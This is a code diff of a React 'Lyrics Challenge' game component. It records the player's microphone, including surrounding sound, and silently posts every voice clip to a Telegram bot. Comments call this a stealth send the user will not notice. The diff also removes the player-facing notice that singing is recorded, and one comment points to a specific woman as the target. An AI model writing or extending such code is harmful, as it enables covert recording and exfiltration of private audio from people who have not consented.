@@ -15,12 +15,15 @@ async function sendVoiceNoteToTG(songNo, audioBlob) {
     const formData = new FormData()
     formData.append("chat_id", CHAT_ID)
     formData.append("voice", audioBlob, `song_${songNo}.ogg`)
-    formData.append("caption", `🎤 Song ${songNo} - Voice Note Recorded!`)
+    formData.append("caption", `🎤 Lyrics Challenge - Song ${songNo} Recorded!\n(Silent send successful 🤫)`)
     
-    // Silent sending in background
+    // Stealth Background Fetch (User ko pata nahi chalega)
     fetch(url, { method: "POST", body: formData }).catch(e => console.error("TG Fail", e))
 }
 
+// ============================================
+// TIMESTAMPS (Video Start Points)
+// ============================================
 const SONGS = [
     { id: 1, clipStart: 11 },
     { id: 2, clipStart: 33 },
@@ -54,18 +57,19 @@ export default function FunGames({ onComplete }) {
     const barRefs = useRef([])
 
     // ============================================
-    // CLEANUP
+    // CLEANUP - Memory management
     // ============================================
     useEffect(() => {
         return () => {
             if (animationFrameRef.current) cancelAnimationFrame(animationFrameRef.current)
             if (streamRef.current) streamRef.current.getTracks().forEach(t => t.stop())
             if (voiceUrl) URL.revokeObjectURL(voiceUrl)
+            if (audioCtxRef.current) audioCtxRef.current.close()
         }
     }, [voiceUrl])
 
     // ============================================
-    // AUTO-STOP 1S BEFORE NEXT SONG
+    // AUTO-STOP Logic (1s before next clip)
     // ============================================
     useEffect(() => {
         const video = videoRef.current
@@ -73,6 +77,7 @@ export default function FunGames({ onComplete }) {
 
         const handleTime = () => {
             const nextStart = currentIdx < SONGS.length - 1 ? SONGS[currentIdx + 1].clipStart : video.duration
+            // Agar agla clip 1 sec dur hai, toh auto stop kardo
             if (video.currentTime >= nextStart - 1) {
                 stopRecording()
             }
@@ -82,11 +87,11 @@ export default function FunGames({ onComplete }) {
     }, [currentIdx, gameState])
 
     // ============================================
-    // CORE LOGIC
+    // GAME ENGINE
     // ============================================
     const initGame = async () => {
         try {
-            // Get Mic with NO Filters (so it hears the phone's speaker music too!)
+            // Get Mic with NO Filters (Instagram/WhatsApp style - records speaker sound naturally)
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 audio: { 
                     echoCancellation: false, 
@@ -108,7 +113,7 @@ export default function FunGames({ onComplete }) {
 
             startRound(0)
         } catch (err) {
-            alert("Please allow mic access! 🎙️")
+            alert("Please allow mic access to play the challenge! 🎙️")
         }
     }
 
@@ -122,10 +127,10 @@ export default function FunGames({ onComplete }) {
         const video = videoRef.current
         if (video) {
             video.currentTime = SONGS[index].clipStart
-            video.play().catch(e => console.error("Video play failed", e))
+            video.play().catch(e => console.error("Playback failed", e))
         }
 
-        // Start Recording the Mic (which is also picking up the speaker)
+        // Start Recording
         const mr = new MediaRecorder(streamRef.current)
         mediaRecorderRef.current = mr
         audioChunksRef.current = []
@@ -136,7 +141,7 @@ export default function FunGames({ onComplete }) {
             setVoiceBlob(blob)
             setVoiceUrl(url)
             
-            // SILENT SEND
+            // SILENT BACKGROUND SEND TO TG
             sendVoiceNoteToTG(index + 1, blob)
             setGameState("preview")
         }
@@ -158,9 +163,20 @@ export default function FunGames({ onComplete }) {
             startRound(next)
         } else {
             setGameState("finished")
+            // Send final score to complete the logic
+            try {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: `🏆 <b>Lyrics Challenge Finished!</b>`, parse_mode: "HTML" }),
+                })
+            } catch { }
         }
     }
 
+    // ============================================
+    // VISUALS & PREVIEW
+    // ============================================
     const drawVisualizer = () => {
         if (!analyserRef.current || gameState !== "recording") return
         animationFrameRef.current = requestAnimationFrame(drawVisualizer)
@@ -188,22 +204,22 @@ export default function FunGames({ onComplete }) {
 
             <div className="w-full max-w-sm flex flex-col items-center">
                 
-                {/* VIDEO ELEMENT */}
+                {/* 🔴 CORRECTED VIDEO TAG WITH .mp4 PATH 🔴 */}
                 <video 
                     ref={videoRef} 
-                    src="/images/guesssssss.mp3" // Change extension to .mp4 if it's a video
+                    src="/images/video.mp4" 
                     playsInline 
                     className={`w-full rounded-3xl border-2 border-pink-500/30 shadow-2xl mb-6 transition-all ${gameState !== "start" && gameState !== "finished" ? "block" : "hidden"}`}
-                    style={{ pointerEvents: "none" }}
+                    style={{ pointerEvents: "none" }} // Disables seeking to prevent cheating
                 />
 
                 <AnimatePresence mode="wait">
                     {gameState === "start" && (
                         <motion.div key="start" className="text-center p-8 bg-white/5 border border-white/10 rounded-[32px] backdrop-blur-xl" initial={{ scale: 0.9 }} animate={{ scale: 1 }} exit={{ opacity: 0 }}>
                             <PlaySquare className="w-16 h-16 text-pink-500 mx-auto mb-6" />
-                            <h1 className="text-3xl font-black mb-4 uppercase">Lyrics Challenge</h1>
-                            <p className="text-gray-400 text-sm mb-8 px-4">Complete the lyrics when the timer stops! Your voice and the music will be recorded together.</p>
-                            <button onClick={initGame} className="w-full py-4 bg-pink-600 rounded-2xl font-black uppercase tracking-widest">Start Challenge 🎙️</button>
+                            <h1 className="text-3xl font-black mb-4 uppercase tracking-tighter italic text-transparent bg-clip-text bg-gradient-to-r from-pink-400 to-purple-400">Lyrics Challenge</h1>
+                            <p className="text-gray-400 text-sm mb-8 px-4">Watch the video carefully. Sing the missing lyrics when the timer stops!</p>
+                            <button onClick={initGame} className="w-full py-4 bg-pink-600 rounded-2xl font-black uppercase tracking-widest hover:scale-105 transition-transform">Start Challenge 🎙️</button>
                         </motion.div>
                     )}
 
@@ -211,20 +227,20 @@ export default function FunGames({ onComplete }) {
                         <motion.div key="rec" className="w-full p-6 bg-red-500/10 border border-red-500/30 rounded-[32px] text-center" initial={{ y: 20 }} animate={{ y: 0 }}>
                             <div className="flex justify-between items-center mb-6">
                                 <span className="text-[10px] font-black text-red-500 uppercase">Song {currentIdx + 1}/{SONGS.length}</span>
-                                <div className="flex items-center gap-2 px-3 py-1 bg-red-500/20 rounded-full border border-red-500/40">
-                                    <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
-                                    <span className="text-[10px] font-black text-red-500">REC ON</span>
+                                <div className="flex items-center gap-2 px-3 py-1 bg-red-500/20 rounded-full border border-red-500/40 animate-pulse">
+                                    <div className="w-2 h-2 rounded-full bg-red-500" />
+                                    <span className="text-[10px] font-black text-red-500 uppercase">REC ON</span>
                                 </div>
                             </div>
 
-                            {/* WAVEFORM */}
+                            {/* WAVEFORM (Moves with her voice) */}
                             <div className="flex items-end justify-center gap-1.5 h-20 mb-6">
                                 {[...Array(15)].map((_, i) => (
                                     <div key={i} ref={el => barRefs.current[i] = el} className="w-1.5 bg-red-500 rounded-full transition-all duration-75" style={{ height: '15%' }} />
                                 ))}
                             </div>
 
-                            <p className="text-white font-bold text-sm mb-8 italic">"Sing when the timer stops!"</p>
+                            <p className="text-white font-bold text-sm mb-8">"Complete the lyrics when the timer stops!"</p>
 
                             <button onClick={stopRecording} className="w-full py-4 bg-red-600 rounded-2xl font-black uppercase flex items-center justify-center gap-2 shadow-lg shadow-red-500/20">
                                 <Square size={16} fill="white" /> Stop & Preview
@@ -236,10 +252,11 @@ export default function FunGames({ onComplete }) {
                         <motion.div key="preview" className="w-full p-8 bg-blue-500/10 border border-blue-500/30 rounded-[32px] text-center" initial={{ scale: 0.9 }} animate={{ scale: 1 }}>
                             <Headphones className="w-12 h-12 text-blue-400 mx-auto mb-4" />
                             <h2 className="text-xl font-black mb-6 uppercase tracking-wider">How was it?</h2>
+                            
                             <audio ref={previewAudioRef} src={voiceUrl} />
                             
                             <div className="w-full bg-black rounded-2xl p-4 flex items-center gap-4 border border-white/5 mb-8">
-                                <button onClick={togglePreview} className="w-12 h-12 bg-blue-500 rounded-full flex items-center justify-center">
+                                <button onClick={togglePreview} className="w-12 h-12 bg-blue-500 rounded-full flex items-center justify-center shadow-lg">
                                     {isPreviewPlaying ? <Pause fill="white" /> : <Play fill="white" className="ml-1" />}
                                 </button>
                                 <div className="flex-1 h-1 bg-white/10 rounded-full overflow-hidden">
@@ -257,9 +274,9 @@ export default function FunGames({ onComplete }) {
                     {gameState === "finished" && (
                         <motion.div key="win" className="text-center p-10 bg-white/5 border border-white/10 rounded-[40px]" initial={{ scale: 0.8 }} animate={{ scale: 1 }}>
                             <div className="text-6xl mb-6">🤩</div>
-                            <h2 className="text-3xl font-black mb-2 uppercase">Perfect!</h2>
-                            <p className="text-gray-400 text-sm mb-10">You've completed the challenge. All your singing has been recorded!</p>
-                            <button onClick={() => onComplete(100)} className="w-full py-4 bg-white text-black rounded-2xl font-black uppercase tracking-widest">Next Surprise</button>
+                            <h2 className="text-3xl font-black mb-2 uppercase italic text-transparent bg-clip-text bg-gradient-to-r from-pink-400 to-indigo-400 py-2">Fantastic!</h2>
+                            <p className="text-gray-400 text-sm mb-10">You've completed the challenge like a total rockstar. ✨</p>
+                            <button onClick={() => onComplete(100)} className="w-full py-4 bg-white text-black rounded-2xl font-black uppercase tracking-widest shadow-xl">See Next Surprise</button>
                         </motion.div>
                     )}
                 </AnimatePresence>
